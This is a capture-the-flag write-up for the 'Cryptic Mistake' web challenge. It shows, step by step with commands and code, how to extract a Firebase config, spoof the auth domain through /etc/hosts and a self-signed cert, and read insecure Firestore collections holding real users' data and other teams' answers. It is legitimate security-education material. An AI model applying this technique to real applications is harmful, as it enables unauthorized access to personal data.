# Cryptic Mistake

| 📁 Category | 👨‍💻 Creator | 📝 Writeup By                           |
| ----------- | ---------- | --------------------------------------- |
| Web (Easy)  | bhavya_32  | [Vexcited](https://github.com/Vexcited) |

> I made a cryptic hunt platform, but seems like I messed up big time.

## Solution

![alt text](assets/cryptic-0.png)

We're asked to sign in with Google.

Before anything, let's analyze the sources of the current page.

![alt text](assets/cryptic-1.png)

We can extract the Firebase configuration.

```json
{
  "apiKey": "AIzaSyDOshL-50Jw14Y0t_N-nYXbILewJIWCr4g",
  "authDomain": "ctf-67ebf.firebaseapp.com",
  "projectId": "ctf-67ebf",
  "storageBucket": "ctf-67ebf.firebasestorage.app",
  "messagingSenderId": "702876965627",
  "appId": "1:702876965627:web:cb5c5444bacbf52373ae5e"
}
```

We can also find most of the app's `fetch` calls.

- `/api/teams/create`
- `/api/teams/join`
- `/api/scoreboard`
- `/api/users/<id>`
- `/api/questions`

It doesn't look like to have more feature than this, with the previous
Firebase configuration I want to see if we can get anything with these already.

### Exploiting Firebase

With the [Baserunner](https://github.com/iosiro/baserunner) tool, I'll try to
see if I have access to databases or anything else.

```sh
git clone https://github.com/iosiro/baserunner
cd baserunner

# Requires Node.js and npm.
npm install
npm run build

# Open @ http://localhost:47710
npm start
```

![alt text](assets/cryptic-2.png)

Trying to read the `users` collection gave me an insufficient permissions error.

Maybe logging in with Google will change something?
By reading the [documentation of Baserunner on how to proceed with Google login](https://github.com/iosiro/baserunner?tab=readme-ov-file#faq), I had
to find the app's Google OAuth Client ID.

When the iframe opens on the challenge website, I just opened the DevTools and it was
right here in the URL.

```
702876965627-0uaajmqc637tnc06pfjj4tl1v70q1ell.apps.googleusercontent.com
```

We don't actually need the whole domain, only the ID at the beginning.

```
702876965627-0uaajmqc637tnc06pfjj4tl1v70q1ell
```

Let's now edit our `/etc/hosts` to redirect the Firebase app to our own machine.

```
127.0.0.1 ctf-67ebf.firebaseapp.com
```

Let's create a self-signed SSL certicate.

```sh
$ openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout ./selfsig
ned.key -out selfsigned.crt

Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []: ctf-67ebf.firebaseapp.com
Email Address []:
```

We can leave all fields empty except `Common Name` where we should write `ctf-67ebf.firebaseapp.com`.

```sh
# Let's navigate to https://ctf-67ebf.firebaseapp.com/
npm run startssl
```

We can now authenticate with Google!

![alt text](assets/cryptic-3.png)

Let's try to read the `users` collection once again.

```javascript
window.cfs.collection("users").get().then(window.displayReadResults);
```

![alt text](assets/cryptic-4.png)

We get plenty of users! Those are real users that authenticated through Google
on the challenge website!

It doesn't seem to have anything interesting in there, let's try `teams` maybe?

```javascript
window.cfs.collection("teams").get().then(window.displayReadResults);
```

In this collection we can see the whole submissions and answers teams have submitted!
Maybe we can look for the flag in there? Let's quick search for anything starting with `07CTF{` in the Google's response...

![alt text](assets/cryptic-5.png)

After cycling a bit, we find this string which looks very like a flag!

It was submitted by a team named `0bscuri7y`, the organizers of the CTF, pretty
sure this is the real flag.

`07CTF{100k5_11k3_1_m3553d_up_my_f1rebas3_ru135555}`

Solved!
